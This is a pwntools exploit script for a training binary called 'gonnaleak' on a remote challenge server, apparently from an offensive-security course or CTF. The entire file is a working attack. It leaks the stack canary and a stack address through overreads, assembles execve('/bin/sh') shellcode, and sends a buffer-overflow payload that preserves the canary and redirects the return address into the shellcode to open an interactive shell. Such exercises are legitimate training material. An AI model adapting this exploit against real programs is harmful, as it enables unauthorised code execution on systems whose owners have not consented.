from pwn import *
import time
from socket import htonl


context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./gonnaleak")
    gdb.attach(r, """
    b* 0x004011f7   
    """)

    input("wait")
else:
    r = remote("bin.training.offdef.it", 2011)


context.arch = 'amd64'
stringa = b"/bin/sh"

print("1:", r.recv())
r.send(b"B"*105)
r.recvuntil(b"> ")
r.read(105)
leaked_canary = b"\x00" + r.read(7)
canary = u64(leaked_canary)
print("[!] leaked_canary %#x" % canary)

r.send(b"A"*152)
r.recvuntil(b"> ")
r.read(152)
leaked_address =  r.read(6) + b"\x00\x00"
addr = u64(leaked_address)
swapped = addr.to_bytes(8, byteorder='big')
print("leaked add %#x" %addr)
print("converted leaked %#d" %addr)

myAddr = 140737488347032  #leaked in locale
mybuff = 140737488346640  #start of buffer in locale

programOff = addr - myAddr

whereToJump = mybuff + programOff + 1
print("Where to jump %#x" %whereToJump)
wtj = whereToJump.to_bytes(8, byteorder='little')

shellcode = """
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
mov rdi, """ + str(whereToJump) + """
add rdi, 0x1d
syscall
"""

assembled = asm(shellcode)
assembled = assembled + stringa + b"\x00"

payload = b"A"+ assembled + b"A"* (103-len(assembled)) + leaked_canary + b"B"*8 + wtj

r.send(payload)

#0x00007ffff7c29d90 leaked in locale
#0x00007fffffffde72 start of buffer in locale


time.sleep(0.5)

r.sendline(b"")

r.interactive()